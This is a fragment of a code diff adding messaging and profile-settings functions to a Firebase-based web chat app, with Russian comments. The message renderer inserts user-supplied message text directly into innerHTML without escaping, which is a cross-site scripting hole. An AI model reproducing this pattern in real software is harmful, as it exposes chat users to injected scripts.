+          div.innerHTML = `<div class="msg-bubble">${msg.text}<span class="msg-time">${time}</span></div>`;
+          document.getElementById('messages-container').appendChild(div);
+          document.getElementById('messages-container').scrollTop = document.getElementById('messages-container').scrollHeight;
+      });
+  };
+
+  // ОБНОВЛЕНО: Сохраняем чат в память (себе и собеседнику)
+  window.sendPrivateMessage = () => {
+      const input = document.getElementById('msg-input');
+      const text = input.value.trim();
+      if(text !== "" && activeChatId) {
+          const timestamp = Date.now();
+          // Отправляем само сообщение
+          push(ref(db, 'chats/' + activeChatId), { sender: currentUser.uid, text: text, time: timestamp });
+          
+          // ЗАПОМИНАЕМ ЧАТ для обоих пользователей
+          set(ref(db, `userChats/${currentUser.uid}/${activePartnerId}`), timestamp);
+          set(ref(db, `userChats/${activePartnerId}/${currentUser.uid}`), timestamp);
+          
+          input.value = "";
+      }
+  };
+
+  document.getElementById('msg-input').addEventListener('keypress', e => { if(e.key === 'Enter') sendPrivateMessage(); });
+
+  window.openSettings = () => {
+      document.getElementById('set-name').value = myProfile.displayName;
+      document.getElementById('set-avatar').value = myProfile.avatar;
+      document.getElementById('settings-modal').style.display = 'flex';
+  };
+  
+  window.closeSettings = () => { document.getElementById('settings-modal').style.display = 'none'; };
+
+  window.saveSettings = async () => {
+      const newName = document.getElementById('set-name').value;
+      const newAvatar = document.getElementById('set-avatar').value;
+      await set(ref(db, 'users/' + currentUser.uid + '/displayName'), newName);
+      await set(ref(db, 'users/' + currentUser.uid + '/avatar'), newAvatar);
+      myProfile.displayName = newName;
+      myProfile.avatar = newAvatar;
+      document.getElementById('my-display-name').innerText = newName;
+      closeSettings();
+      renderUserList(); // Обновляем список слева, если мы сменили аватарку
+  };
 </script>
+
 </body>
 </html>
-
